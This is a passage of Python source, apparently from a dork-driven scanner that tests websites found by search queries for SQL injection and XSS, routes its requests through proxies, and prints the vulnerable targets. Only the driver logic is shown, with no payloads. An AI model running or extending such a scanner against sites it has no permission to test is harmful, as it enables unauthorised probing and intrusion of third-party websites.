        # Call the function to initialize the arrays
        website_list_sqli, website_list_xss = read_potential_sites()
        
        if not website_list_sqli and not website_list_xss:
            cprint("No websites found matching the dorks. Please adjust your search criteria.", 'red', file=sys.stderr)
        else:
            if website_list_sqli:
                cprint("\nTesting websites for SQL injection vulnerability...\n", 'yellow', file=sys.stderr)
                vuln_sqli = test_vulnerability_sqli(website_list_sqli,proxies)
            if website_list_xss:
                cprint("\nTesting websites for XSS vulnerability...\n", 'yellow', file=sys.stderr)
                vuln_xss = test_vulnerability_xss(website_list_xss,proxies)
        
        cprint(banner_terminal_res , 'green', file=sys.stderr)

        if vuln_sqli:
            cprint("The following targets are affected with SQLi:", "red", file=sys.stderr)
            for target in vuln_sqli:
                cprint(target, "red", file=sys.stderr)
                
        if vuln_xss:
            cprint("The following targets are affected with XSS:", "red", file=sys.stderr)
            for target in vuln_xss:
                cprint(target, "red", file=sys.stderr)
    finally:
        sys.stderr = orig_stdout
        f.close()   